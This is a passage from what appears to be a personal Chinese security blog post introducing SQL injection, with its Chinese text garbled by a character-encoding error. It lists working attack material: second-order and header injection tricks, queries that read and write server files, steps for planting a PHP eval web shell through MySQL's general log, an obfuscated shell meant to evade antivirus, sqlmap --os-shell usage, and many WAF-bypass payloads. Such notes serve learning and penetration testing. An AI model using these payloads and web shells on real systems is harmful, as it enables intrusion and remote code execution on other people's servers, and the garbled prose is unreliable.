<p>ËøôÈáåÊàë‰ª¨Â∞ùËØï‰øÆÊîπ admin ÁöÑÂØÜÁ†ÅÔºåÊîπ‰∏∫ abc123ÔºåÂÖàÊ≥®ÂÜå admin‚Äô#ÔºåÂÜç‰ΩøÁî®‰øÆÊîπÂØÜÁ†ÅÂäüËÉΩ‰øÆÊîπÂÆÉÁöÑÂØÜÁ†ÅÔºåÂõ†‰∏∫Ê≠§Êó∂ SQL ËØ≠Âè•Ë¢´ÊèêÂâçÈó≠ÂêàÔºåÊâÄ‰ª•ÂÆûÈôÖ‰∏ä‰øÆÊîπÁöÑÊòØ admin ÁöÑÂØÜÁ†Å</p>
<h3 id="cookieÊ≥®ÂÖ•"><a class="markdownIt-Anchor" href="#cookieÊ≥®ÂÖ•"></a> cookieÊ≥®ÂÖ•</h3>
<p>Ê≥®ÂÖ•ÁÇπÂú®Cookie Êï∞ÊçÆ‰∏≠</p>
<h3 id="base64Ê≥®ÂÖ•"><a class="markdownIt-Anchor" href="#base64Ê≥®ÂÖ•"></a> base64Ê≥®ÂÖ•</h3>
<p>Ê≥®ÂÖ•ÁöÑÂèÇÊï∞ÈúÄË¶ÅËøõË°å<code>base64</code>ÁºñÁ†Å</p>
<h3 id="user-agentrefererÊ≥®ÂÖ•"><a class="markdownIt-Anchor" href="#user-agentrefererÊ≥®ÂÖ•"></a> user-agent,refererÊ≥®ÂÖ•</h3>
<p>Ê≥®ÂÖ•ÂèÇÊï∞Âú®<code>referer</code>or<code>user-agent</code>Â≠óÊÆµ‰∏≠</p>
<h3 id="sqlÊ≥®ÂÖ•ËØªÂÜôÊñá‰ª∂"><a class="markdownIt-Anchor" href="#sqlÊ≥®ÂÖ•ËØªÂÜôÊñá‰ª∂"></a> sqlÊ≥®ÂÖ•ËØªÂÜôÊñá‰ª∂</h3>
<p>ÂâçÊèêÊù°‰ª∂ÔºöÂΩìÂâçÁî®Êà∑ÊúâËØªÂÜôÊùÉÈôêÔºåÂ¶Çroot@localhostÂíåÂ∑≤Áü•Êñá‰ª∂ËØªÂÜôÁöÑÁªùÂØπË∑ØÂæÑ</p>
<p>?id=33 and 1=2 UNION SELECT 1,2, hex(file_priv),4,5,6,7,8,9,10,11,12,13,14,15from mysql.user where user=‚Äòroot‚Äô and host=‚Äòlocalhost‚Äô</p>
<p>file_privÊòØÊü•ÁúãËØ•Áî®Êà∑ÊòØÂê¶Â≠òÂú®ÊúâËØªÂÜôÊñá‰ª∂ÁöÑÊùÉÈôê</p>
<p><strong>secure_file_priv****ÂèÇÊï∞ÈôêÂà∂‰∫Ümysqld(MySQL DBMS) ÁöÑÂØºÂÖ•ÂØºÂá∫Êìç‰ΩúÔºåËøô‰∏™ÈÄâÈ°πÊòØ‰∏çËÉΩÂà©Áî®SQL ËØ≠Âè•‰øÆÊîπÔºå‰øÆÊîπmy.ini ÈÖçÁΩÆÊñá‰ª∂ÔºåÂπ∂ ÈáçÂêØmysql Êï∞ÊçÆÂ∫ì„ÄÇ</strong></p>
<p><strong>secure_file_privÂØπËØªÂÜôÊñá‰ª∂ÁöÑÂΩ±ÂìçÔºö</strong></p>
<p>secure_file_privÂú®mysqlÁöÑ<strong>my.ini</strong>‰∏≠ËÆæÁΩÆÔºåÁî®Êù•ÈôêÂà∂ <strong>load_file()„ÄÅinto outfile„ÄÅinto dumpfile ÂáΩÊï∞Âú®Âì™‰∏™ÁõÆÂΩï‰∏ãÊã•Êúâ<strong><strong>‰∏ä‰º†ÊàñËÄÖËØªÂèñ</strong></strong>Êñá‰ª∂ÁöÑÊùÉÈôê</strong>„ÄÇ</p>
<h4 id="sqlÊ≥®ÂÖ•Êñá‰ª∂ËØªÂÜôÊñπÂºè"><a class="markdownIt-Anchor" href="#sqlÊ≥®ÂÖ•Êñá‰ª∂ËØªÂÜôÊñπÂºè"></a> sqlÊ≥®ÂÖ•Êñá‰ª∂ËØªÂÜôÊñπÂºè</h4>
<p>load_file() ÔºöËØªÂèñÊåáÂÆöÊñá‰ª∂</p>
<p>LOAD DATA LOCAL INFILEÔºöËØªÂèñÊåáÂÆöÊñá‰ª∂[<strong>ÂΩìsecure_file_priv‰∏∫nullÊó∂ÂèØ‰ª•‰ª£Êõøload_file()</strong>]</p>
<p>into outfile ÔºöÂ∞ÜÊü•ËØ¢ÁöÑÊï∞ÊçÆÂÜôÂÖ•Êñá‰ª∂‰∏≠</p>
<p>into dumpfileÔºöÂ∞ÜÊü•ËØ¢ÁöÑÊï∞ÊçÆÂÜôÂÖ•Êñá‰ª∂‰∏≠ (Âè™ËÉΩÂÜôÂÖ•‰∏ÄË°åÊï∞ÊçÆ)</p>
<p>sqlmap: --file-write Ë¶ÅÂÜôÂÖ•ÁöÑÊñá‰ª∂ --file-dest ÂÜôÂÖ•ÁöÑÁªùÂØπË∑ØÂæÑ</p>
<h4 id="Êü•Áúãsecure_file_privËÆæÁΩÆÁä∂ÊÄÅ"><a class="markdownIt-Anchor" href="#Êü•Áúãsecure_file_privËÆæÁΩÆÁä∂ÊÄÅ"></a> Êü•Áúãsecure_file_privËÆæÁΩÆÁä∂ÊÄÅ</h4>
<p><strong>show global variables like ‚Äòsecure%‚Äô;</strong></p>
<p>ÈôêÂà∂mysqld ‰∏çÂÖÅËÆ∏ÂØºÂÖ•/ÂØºÂá∫Ôºösecure_file_priv=null (ÈªòËÆ§)</p>
<p>ÈôêÂà∂mysqld ÁöÑÂØºÂÖ•/ÂØºÂá∫ Âè™ËÉΩÂèëÁîüÂú®/tmp/ÁõÆÂΩï‰∏ãÔºösecure_file_priv=/tmp/</p>
<p>‰∏çÂØπmysqld ÁöÑÂØºÂÖ•/ÂØºÂá∫ÂÅöÈôêÂà∂Ôºösecure_file_priv=‚Äò‚Äô</p>
<h4 id="È´òÊùÉÈôêÊ≥®ÂÖ•ÈÅáÂà∞secure_file_priv"><a class="markdownIt-Anchor" href="#È´òÊùÉÈôêÊ≥®ÂÖ•ÈÅáÂà∞secure_file_priv"></a> È´òÊùÉÈôêÊ≥®ÂÖ•ÈÅáÂà∞secure_file_priv</h4>
<p>Âú®mysqlÈ´òÁâàÊú¨ÁöÑÈÖçÁΩÆÊñá‰ª∂‰∏≠ÈªòËÆ§Ê≤°Êúâsecure_file_privËøô‰∏™ÈÄâÈ°πÔºå‰ΩÜÊòØ‰Ω†Áî®SQLËØ≠Âè•Êù•Êü•Áúãsecure_file_privÂèëÁé∞ÔºåÊ≤°ÈÖçÁΩÆËøô‰∏™ÈÄâÈ°πÂ∞±ÊòØNULLÔºå‰πüÂ∞±ÊòØËØ¥Êó†Ê≥ïÂØºÂá∫Êñá‰ª∂„ÄÇ</p>
<p>**Êõø‰ª£ÊñπÊ≥ïÔºö<code>**set global general_log=on;set global general_log_file='C:/phpStudy/WWW/123.php';select '&lt;?php eval($_POST[123]) ?&gt;';</code></p>
<h4 id="sqlÊ≥®ÂÖ•Âà©Áî®Êó•ÂøóÂÜôshell"><a class="markdownIt-Anchor" href="#sqlÊ≥®ÂÖ•Âà©Áî®Êó•ÂøóÂÜôshell"></a> SQLÊ≥®ÂÖ•Âà©Áî®Êó•ÂøóÂÜôshellÔºö</h4>
<p>outfileË¢´Á¶ÅÊ≠¢ÔºåÊàñËÄÖÂÜôÂÖ•Êñá‰ª∂Ë¢´Êã¶Êà™</p>
<p>Âú®Êï∞ÊçÆÂ∫ì‰∏≠Êìç‰ΩúÂ¶Ç‰∏ãÔºöÔºàÂøÖÈ°ªÊòØrootÊùÉÈôêÔºâ</p>
<p>1.<code>show variables like ‚Äò%general%'; #</code>Êü•ÁúãÈÖçÁΩÆ</p>
<p>2.<code>set global general_log = on; #</code>ÂºÄÂêØgeneral logÊ®°Âºè</p>
<p>3.<code>set global general_log_file = ‚Äò/var/www/html/1.php'; #</code>ËÆæÁΩÆÊó•ÂøóÁõÆÂΩï‰∏∫shellÂú∞ÂùÄ</p>
<p>4.<code>select ‚Äò&lt;?php eval($_POST[cmd]);?&gt;‚Äô #</code>ÂÜôÂÖ•shell</p>
<p>ÊúÄÂêéÂÜçÁî®ËöÅÂâëËøûÊé•</p>
<p>‰∏çÊàêÂäüÁöÑÊ°à‰æãÔºåÂ¶ÇÊûúmysql Ë¢´ÈôçÊùÉÔºåÊòØÊó†Ê≥ïÂÜôÂÖ•Âà∞ÂÖ∂‰ªñÁöÑÁ´ôÁÇπÁõÆÂΩïÁöÑÔºåÈô§Èùû‰Ω†ÁöÑÁõÆÊ†áÁõÆÂΩïÊòØÂèØ‰ª•ÂÜôÂÖ•ÁöÑ„ÄÇ</p>
<p>SQLÊü•ËØ¢ÂÖçÊùÄshellÁöÑËØ≠Âè•Ôºö</p>
<p><code>SELECT ‚Äú&lt;?php $p = array(‚Äòf‚Äô=&gt;‚Äôa‚Äô,‚Äôpffff‚Äô=&gt;‚Äôs‚Äô,‚Äôe‚Äô=&gt;‚Äôfffff‚Äô,‚Äôlfaaaa‚Äô=&gt;‚Äôr‚Äô,‚Äônnnnn‚Äô=&gt;‚Äôt‚Äô);$a = array_keys($p);$_=$p[‚Äòpffff‚Äô].$p[‚Äòpffff‚Äô].$a[2];$_= ‚Äòa‚Äô.$_.‚Äôrt';$_(base64_decode($_REQUEST[‚Äòusername‚Äô]));?&gt;‚Äù</code></p>
<h3 id="sqlmapÂ∏∏ËßÅ‰ΩøÁî®"><a class="markdownIt-Anchor" href="#sqlmapÂ∏∏ËßÅ‰ΩøÁî®"></a> sqlmapÂ∏∏ËßÅ‰ΩøÁî®</h3>
<p>-u Ê£ÄÊµãÊòØÂê¶Â≠òÂú®sqlÊ≥®ÂÖ•ÊºèÊ¥û</p>
<p>‚Äìdbs ÂàóÂá∫ÊâÄ‰ª•ÁöÑÊï∞ÊçÆÂ∫ìÂêç</p>
<p>‚Äìcurrent-user Êü•ÁúãÂΩìÂâçÁî®Êà∑Âêç</p>
<p>‚Äìcurrent-db Êü•ÁúãÂΩìÂâçÊï∞ÊçÆÂ∫ìÂêç</p>
<p>-D ‚Äú‚Äù ÈÄâÊã©Êü•ÁúãÊåáÂÆöÊï∞ÊçÆÂ∫ì</p>
<p>‚Äìtables Êü•ÁúãÊåáÂÆöÊï∞ÊçÆÂ∫ì‰∏ãÁöÑÊâÄÊúâË°®Âêç</p>
<p>-T ‚Äú‚Äù ÈÄâÊã©Êü•ÁúãÊåáÂÆöÁöÑË°®</p>
<p>‚Äìcolumns Êü•ÁúãÊåáÂÆöË°®Âêç‰∏ãÁöÑÊâÄÊúâÂ≠óÊÆµÂêç</p>
<p>-C ‚Äú‚Äù ÈÄâÊã©Êü•ÁúãÊåáÂÆöÁöÑÂ≠óÊÆµÔºåÂèØÊé•Â§ö‰∏™ÂèÇÊï∞ÔºåÊúâÈÄóÂè∑ÂàÜÈöî</p>
<p>‚Äìdump ÂàóÂá∫ÊâÄÊúâÂ≠óÊÆµÂÜÖÂÆπ</p>
<p>-r ‰ªéÊñá‰ª∂‰∏≠ËØªÂèñHTTP ËØ∑Ê±Ç</p>
<p>‚Äìos-shell Âú®ÁâπÂÆöÊÉÖÂÜµ‰∏ãÔºåÂèØ‰ª•Áõ¥Êé•Ëé∑ÂæóÁõÆÊ†áÁ≥ªÁªüShell</p>
<p>‚Äìlevel 3 ËÆæÁΩÆsqlmap Ê£ÄÊµãÁ≠âÁ∫ß 3</p>
<p>‚Äìcookie=‚Äúusername=admin‚Äù Êê∫Â∏¶Cookie ‰ø°ÊÅØËøõË°åÊ≥®ÂÖ•</p>
<p>-g Âà©Áî®google ÊêúÁ¥¢ÂºïÊìéËá™Âä®ÊêúÁ¥¢Ê≥®ÂÖ•ÁÇπ</p>
<p>‚Äìbatch ‰ΩøÁî®ÈªòËÆ§ÈÄâÈ°π</p>
<p>POSTÊ≥®ÂÖ•Ôºö</p>
<p>ÂÖàbpÊäìÂåÖÔºå‰øùÂ≠òÂà∞‰∏Ä‰∏™Êñá‰ª∂ÈáåÔºåÁÑ∂Âêésqlmap -r x.postËøêË°å</p>
<p>Áõ¥Êé•getshell</p>
<p>ÂèóÂà∞secure_file_priv ÈÄâÈ°πÁöÑÈôêÂà∂ÔºåË¶Å‰∏∫Á©∫Ôºõ</p>
<p>ÁõÆÊ†áÁ≥ªÁªüWeb Ê†πÁõÆÂΩïÁöÑÁªùÂØπË∑ØÂæÑ„ÄÇ</p>
<p>‰æãÂ¶ÇÔºösqlmap -u ‚Äú<a target="_blank" rel="noopener" href="http://192.168.16.119/show.php?id=33">http://192.168.16.119/show.php?id=33</a>‚Äù --os-shell</p>
<h2 id="ÁªïËøáÂßøÂäø"><a class="markdownIt-Anchor" href="#ÁªïËøáÂßøÂäø"></a> ÁªïËøáÂßøÂäø</h2>
<blockquote>
<p><strong>Ôºà‰∏ÄÔºâÊû∂ÊûÑÂ±ÇÁªïWAF</strong></p>
<p>Ôºà1ÔºâÁî®Êà∑Êú¨Ë∫´ÊòØËøõÂÖ•wafÂêéËÆøÈóÆwebÈ°µÈù¢ÁöÑÔºåÂè™Ë¶ÅÊàë‰ª¨ÊâæÂà∞webÁöÑÁúüÂÆûIPÔºåÁªïËøáwafÂ∞±‰∏çÂú®ËØù‰∏ã‰∫Ü„ÄÇ</p>
<p>Ôºà2ÔºâÂú®ÂêåÁΩëÊÆµÂÜÖÔºåÈ°µÈù¢‰∏éÈ°µÈù¢‰πãÈó¥ÔºåÊúçÂä°Âô®‰∏éÊúçÂä°Âô®‰πãÈó¥ÔºåÈÄöËøáwafÁöÑ‰øùÊä§ÔºåÁÑ∂ÂêéÂ±ïÁ§∫ÁªôÊàë‰ª¨ÔºåÂè™Ë¶ÅÊàë‰ª¨Âú®ÂÜÖÈÉ®ÊúçÂä°‰πãÈó¥ËøõË°åËÆøÈóÆÔºåÂç≥ÂèØÁªïËøáwaf</p>
<p>Ôºà3ÔºâËæπÁïåÊºèÊ¥ûÔºåÂêåÊ†∑Á±ª‰ºº‰∫éÂêåÁΩëÊÆµÊï∞ÊçÆÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Â∑≤Áü•ÊúçÂä°Âô®Â≠òÂú®ÁöÑssrfÊºèÊ¥ûÔºåÂ∞ÜÊï∞ÊçÆÁõ¥Êé•ÂèëÈÄÅÁªôÂêåÁΩëÊÆµÁöÑweb2ËøõË°åSQLÊ≥®ÂÖ•</p>
</blockquote>
<blockquote>
<p><strong>‰∫åÔºâËµÑÊ∫êÈôêÂà∂ËßíÂ∫¶ÁªïWAF</strong></p>
<p>ÊúâÁöÑÊó∂ÂÄôÔºåÁî±‰∫éÊï∞ÊçÆÂ§™Â§ßÔºå‰ºöÂØºËá¥wafÊó†Ê≥ïÂ∞ÜÊâÄÊúâÁöÑÊï∞ÊçÆÈÉΩÊ£ÄÊµãÂÆåÔºåËøô‰∏™Êó∂ÂÄô‰ºöÂøΩÁï•ÊéâÊàë‰ª¨‰ª£ÂÖ•ÁöÑsqlÊ≥®ÂÖ•ËØ≠Âè•Ôºå‰ªéËÄåÁªïËøáwafÔºåÂç≥Ôºö‰ΩøÁî®POSTËØ∑Ê±ÇÔºåÂØπÊúçÂä°Âô®ËØ∑Ê±ÇÂæàÂ§ßËµÑÊ∫êÈÄÉÈÄ∏sqlÊ≥®ÂÖ•ËØ≠Âè•„ÄÇ</p>
</blockquote>
<blockquote>
<p><strong>Ôºà‰∏âÔºâÂçèËÆÆÂ±ÇÈù¢ÁªïËøáWAF</strong></p>
<p>Ôºà1ÔºâÂü∫‰∫éÂçèËÆÆÂ±ÇÔºåÊúâÁöÑwafÂè™ËøáÊª§GETËØ∑Ê±ÇÔºåËÄåÂØπPOSTËØ∑Ê±ÇÊ≤°ÂÅöÂà´ÁöÑÈôêÂà∂ÔºåÂõ†Ê≠§ÔºåÂèØ‰ª•Â∞ÜGETÂûãÊç¢‰∏∫POSTÂûã</p>
<p>Ôºà2ÔºâÊñá‰ª∂Ê†ºÂºèÔºåÈ°µÈù¢‰ªÖÂØπContent-Type‰∏∫application/x-www-form-urlencodedÊï∞ÊçÆÊ†ºÂºèËøõË°åËøáÊª§ÔºåÂõ†Ê≠§Êàë‰ª¨Âè™Ë¶ÅÂ∞ÜContent-TypeÊ†ºÂºè‰øÆÊîπ‰∏∫multipart/form-data,Âç≥ÂèØÁªïËøáwaf</p>
<p>Ôºà3ÔºâÂèÇÊï∞Ê±°ÊüìÔºöÊúâÁöÑwaf‰ªÖÂØπÈÉ®ÂàÜÂÜÖÂÆπËøõË°åËøáÊª§Ôºå‰æãÂ¶ÇÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">index.php?id&#x3D;1&amp;id&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ËøôÊ†∑ÁöÑÂèÇÊï∞id=1,waf‰πüËÆ∏‰ªÖÂØπÂâçÈÉ®ÂàÜÁöÑid=1ËøõË°åÊ£ÄÊµãÔºåËÄåÂêéÈù¢ÁöÑÂèÇÊï∞Âπ∂‰∏çÂÅöÂ§ÑÁêÜ„ÄÇËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•Âú®id=2ÁöÑÂêéÈù¢ÂÜôÂÖ•sqlÊ≥®ÂÖ•ËØ≠Âè•ËøõË°åsqlÊ≥®ÂÖ•</p>
</blockquote>
<blockquote>
<p><strong>ÔºàÂõõÔºâËßÑÂàôÂ±ÇÈù¢ÁªïËøá</strong></p>
<p>Ôºà1ÔºâÈ¶ñÂÖà‰ΩøÁî®ÊØîËæÉÁâπÊÆäÁöÑÊñπÊ≥ïËøõË°åÁªïËøáÔºö</p>
<p>ÂèØ‰ª•Âú®Ê≥®ÂÖ•ÁÇπÔºåÊµãËØïwafÂà∞Â∫ïÊã¶Êà™ÁöÑÂì™‰∏ÄÈÉ®ÂàÜÁöÑÊï∞ÊçÆÔºåÂ¶ÇÊûúÊòØÁ©∫Ê†ºÔºåÂèØ‰ª•Â∞ùËØïÔºö/<em>%!%2f</em>/</p>
<p>Â¶ÇÊûúÊòØÂØπsqlÁöÑÂáΩÊï∞ËøõË°å‰∫ÜËøáÊª§ÔºåÂèØ‰ª•Â∞ùËØïÔºöXX()     ‚Äî‚Äî&gt;    XX/<em>%!%2f</em>/()</p>
<p>Ôºà2Ôºâ‰ª•‰∏ã‰∏∫Â∏∏ËßÅÁöÑËßÑÂàôÊõøÊç¢ÔºåÈÉ®ÂàÜÂßøÂäøÔºö</p>
<img src="/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/1674381-20190707141421874-1913088861.jpg" class="" loading="lazy">
<p>(3)Â§ßÂ∞èÂÜôÁªïËøá</p>
<p><code>select * from users where id='1' uNioN SeleCt 1,2,3;</code></p>
<p>(4)ÂÖ≥ÈîÆÂ≠óÈáçÂ§çÂèåÂÜô</p>
<p><code>select * from users where id=1 ununionion selselectect 1,2,3;</code></p>
<p>(5)ÁºñÁ†Å</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span><span class="token operator">%</span><span class="token number">0</span>Aselect<span class="token operator">%</span><span class="token number">0</span>A1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">//Ëá™ÊµãÊàêÂäüÔºå‰ΩÜ%2b‰∏çÊàêÂäü</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">75</span>nion <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">//Ëá™ÊµãÊàêÂäüÔºåÁªßÁª≠Âä†Ê≤π</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>(6)ÂÜÖËÅîÊ≥®Èáä</p>
<p><code>select * from users where id=1 union/**/select/**/1,2,3;//Ëá™ÊµãÊàêÂäüÔºåÁªßÁª≠Âä†Ê≤π</code></p>
<p>(7)Á≠â‰ª∑ÂáΩÊï∞ÊõøÊç¢</p>
<p>version()-&gt;@@version</p>
<p>mid-&gt;substr-&gt;substring</p>
<p>@@datadir-&gt;datadir</p>
<p>(8)ÁâπÊÆäÁ¨¶Âè∑</p>
<p>+ # _ _ 23 --+ \\\\ `  @</p>
<p><code>select * from users where id=1 union+select+1,2,3;</code></p>
<p>(9)ÂÜÖËÅîÊ≥®Èáä</p>
<p><code>select * from users where id=1 /*!union*/select 1,2,3;</code></p>
<p>(10)ÁºìÂÜ≤Âå∫Ê∫¢Âá∫</p>
<p><code>select * from users where id=1  and (select 1)=(Select 0xA*1000) uNiOn SeLeCt 1,2,version();</code></p>
<pre class="line-numbers language-none"><code class="language-none">0xA*1000  ÊåáÁöÑÊòØ0XAÂêéÈù¢ÁöÑ &quot;A&quot; ÈáçÂ§ç1000Ê¨°
‰∏ÄËà¨Êù•ËØ¥ÂØπÂ∫îÁî®ËΩØ‰ª∂ÊûÑÊàêÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÈÉΩÈúÄË¶ÅÊØîËæÉÂ§ßÁöÑÊµãËØïÈïøÂ∫¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>(11)MYSQLÁâπÊÄßÁªïËøá</p>
<p>1.= Á≠â‰∫é<br />
Ôºö= ËµãÂÄº<br />
@ @+ÂèòÈáèÂêçÂèØÁõ¥Êé•Ë∞ÉÁî®</p>
<pre class="line-numbers language-none"><code class="language-none">select * from users where id&#x3D;1 union select @test&#x3D;user(),2,3;&#x2F;&#x2F;1
select * from users where id&#x3D;1 union select @test:&#x3D;user(),2,3;&#x2F;&#x2F;,root
select * from users where id&#x3D;1 union select @,2,3;&#x2F;&#x2F;NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>(12)ÈªëÈ≠îÊ≥ï</p>
<p>{x user}  {x mysql.user}</p>
<pre class="line-numbers language-none"><code class="language-none">select&#123;x user&#125;from&#123;x mysql.user&#125;;&#x2F;&#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/07/05/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" rel="prev" title="pikachuÈù∂Âú∫ÈÄöÂÖ≥ËÆ∞ÂΩï"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">pikachuÈù∂Âú∫ÈÄöÂÖ≥ËÆ∞ÂΩï</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/07/03/%E5%88%9D%E8%AF%86XXE/" rel="next" title="ÂàùËØÜXXE"><span class="post-nav-text">ÂàùËØÜXXE</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>ÊÇ®ÈúÄË¶ÅÁßëÂ≠¶‰∏äÁΩëÔºåÊâçÂèØ‰ΩøÁî®ËØÑËÆ∫Âå∫ÂäüËÉΩ„ÄÇ</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank"></a></div><div class="copyright"><span>&copy; 2023 ‚Äì 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Npc</span></div><div class="footer-custom-text">=w=</div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>